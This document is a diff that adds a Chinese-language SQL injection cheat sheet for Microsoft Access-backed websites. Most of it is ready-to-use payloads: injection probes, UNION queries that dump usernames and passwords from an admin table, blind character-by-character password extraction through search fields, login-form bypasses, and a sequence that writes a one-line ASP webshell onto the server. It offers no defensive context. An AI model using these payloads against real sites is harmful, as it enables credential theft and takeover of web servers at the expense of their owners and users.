@@ -1,0 +1,89 @@
+1.判断注入.  
+
+and 1=1 
+and 1=2
+或者        
+ -0
+ -1                 看页面的变化
+
+2.  access注入.
+
+联合查询
+order by 10
+and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin
+and 1=2 union select 1,username,3,4,password,6,7,8,9,10 from admin
+
+3.   access偏移注入. 条件须有id字段
+
+order by 13
+and 1=2 union select 1,2,3,4,5,6,7,8,9,* from admin  直到*正常
+
+13-9=4    4*2=8   13-8=5
+and 1=2 union select 1,2,3,4,5,* from (admin as a inner join admin as b on a.id=b.id)
+
+
+4.  access爆字段
+
+select * from next where id=1  ORDER BY sum(1)
+只能爆出一个字段 如为  bm_username  就可以猜其他的了
+
+5  .access搜索型注入
+
+2010%'and(select count(*)from mssysaccessobjects)>0 and '%'=' //返回正常。access数据库
+2010%'and(select count(*)from admin)>0 and '%'='              //返回正常存 在admin表
+2010%'and(select count(username)from admin)>0 and '%'='       //返回正常,存在username字段
+2010%'and(select count(password)from admin)>0 and '%'='       //返回正常,并且存在password字段
+2010%'and(select top 1 len(username)from admin)>4 and '%'='   //返回正常username长度大于4
+2010%'and(select top 1 len(username)from admin)=5 and '%'='   //返回正常username长度等于5
+2010%'and(select top 1 len(password)from admin)=32 and '%'='  //返回正常,密码长度为32位加密。
+
+username length 5
+password length 32
+
+2010%'and(select top 1 asc(mid(username,1,1))from admin)=97 and '%'='   //a
+以下都是对应位置的ascii的编码，如果不是则返回错误。
+2010%'and(select top 1 asc(mid(password,1,1))from admin)=48 and '%'=',
+2010%'and(select top 1 asc(mid(password,2,1))from admin)=102 and '%'='
+2010%'and(select top 1 asc(mid(password,3,1))from admin)=101 and '%'='
+2010%'and(select top 1 asc(mid(password,4,1))from admin)=102 and '%'='
+
+这个查询太费时间了 可以试下union联合查询
+2010%' order by 10 and '%'='
+2010%' and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin and '%'='
+2010%'and 1=2 union select 1,username,3,4,password,6,7,8,9,10 from admin and '%'='
+
+
+6.access登陆框注入
+
+1.  a' or(select count(*) from admin)>0 and '1'='1 
+2.  a' or(select count(username) from admin)>0 and '1'='1 
+3.  a' or(select count(password) from admin)>0 and '1'='1 
+
+这个查询太费时间了 可以试下union联合查询
+
+a' union select 1,2,3,4,5,6,7,8,9,10 from admin and '1'='1 
+a' union select 1,username,3,4,password,6,7,8,9,10 from admin and '1'='1 
+
+
+7.ACCESS执行SQL语句导出一句话拿webshell
+
+第一句代码
+1.create table cmd (a varchar(50))  
+第二句代码
+1.insert into cmd (a) values ('一句话木马')  
+第三句代码
+1.select * into [a] in 'e:\host\web2011\ok.asp;ok.xls' 'excel 4.0;' from cmd  
+第四句代码
+1.drop table cmd  
+
+
+
+
+
+
+
+
+
+
+
+
